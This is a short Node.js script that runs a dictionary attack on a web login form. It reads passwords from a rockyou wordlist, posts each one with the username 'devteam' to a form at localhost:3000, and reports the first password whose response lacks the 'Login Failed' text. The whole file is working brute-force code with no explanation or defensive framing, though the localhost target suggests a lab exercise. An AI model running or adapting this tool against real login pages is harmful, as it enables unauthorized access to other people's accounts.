const fs = require('fs')
const axios = require ('axios')
const qs = require('qs')


const configuration = {
    htmlFormUrl : "http://localhost:3000",
    passwordFile : "rockyou-20.txt",
    username : "devteam",
    failedPasswordText : "Login Failed"
}

findValidPassword(configuration)

async function findValidPassword(configuration){
    const {passwordFile} = configuration
    for(const password of readPossiblePasswords(passwordFile)){
        const passwordValidity = await checkPasswordValidaty(configuration, password)
        console.log(`checking password: ${password}`)
        if(passwordValidity.isValidPassword){
            console.log("found valid password")
            console.log(`password:${passwordValidity.password}`)
            break
        }
    }
}


function readPossiblePasswords(passwordFile) {
    const data = fs.readFileSync(passwordFile, 'utf-8')
    const lines = data.split(/\r?\n/)
    return lines
};


async function checkPasswordValidaty(configuration, password){
    const {username, htmlFormUrl, failedPasswordText} = configuration
    const data = { username: username, password : password}
    
    const options = {
        headers: { 'content-type': 'application/x-www-form-urlencoded' }
      }
    const response = await axios.post(
        htmlFormUrl, qs.stringify(data),
        options)
    
    
    const isValidPassword = !response.data.includes(failedPasswordText)
    return {password: password, isValidPassword}
    
}




